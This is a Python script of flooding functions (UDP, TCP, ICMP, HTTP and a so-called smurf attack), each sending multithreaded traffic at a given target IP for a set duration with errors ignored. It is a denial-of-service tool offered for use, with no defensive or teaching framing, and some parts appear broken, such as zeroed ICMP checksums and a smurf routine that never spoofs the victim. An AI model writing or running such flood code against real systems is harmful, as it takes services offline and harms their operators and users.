import socket
import random
import threading
import time

def udp_flood(target_ip, target_port, duration, threads_count):

    end_time = time.time() + duration
    
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        packet_size = 1024

        packet = random._urandom(packet_size)


        
        while time.time() < end_time:

            try:

                sock.sendto(packet, (target_ip, target_port))

            except:
                pass

        sock.close()

    
    for _ in range(threads_count):

        thread = threading.Thread(target=flood)

        thread.start()

def tcp_flood(target_ip, target_port, duration, threads_count):

    end_time = time.time() + duration

    
    def flood():

        while time.time() < end_time:

            try:

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                sock.settimeout(0.1)

                sock.connect((target_ip, target_port))

                sock.send(b'X' * 1024)


                sock.close()
            except:
                pass
    
    for _ in range(threads_count):


        thread = threading.Thread(target=flood)

        thread.start()

def icmp_flood(target_ip, duration, threads_count):

    end_time = time.time() + duration
    
    def flood():
        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        except:


            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(64)

        
        while time.time() < end_time:


            try:

                sock.sendto(packet, (target_ip, 0))
            except:


                pass
        sock.close()
    
    for _ in range(threads_count):

        thread = threading.Thread(target=flood)


        thread.start()

def http_flood(target_ip, duration, threads_count):


    end_time = time.time() + duration
    
    def flood():

        while time.time() < end_time:


            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



                sock.settimeout(0.5)


                sock.connect((target_ip, 80))
                
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"


                sock.send(request.encode())


                sock.close()
            except:
                pass
    
    for _ in range(threads_count):


        thread = threading.Thread(target=flood)


        thread.start()

def smurf_attack(target_ip, duration, threads_count):


    broadcast_ips = ['192.168.1.255', '10.0.0.255', '172.16.255.255']


    end_time = time.time() + duration
    
    def flood():

        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)


        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
        
        while time.time() < end_time:
            for bc_ip in broadcast_ips:

                try:
                    sock.sendto(packet, (bc_ip, 0))
                except:


                    pass
        sock.close()
    

    for _ in range(threads_count):

        thread = threading.Thread(target=flood)

        thread.start()
        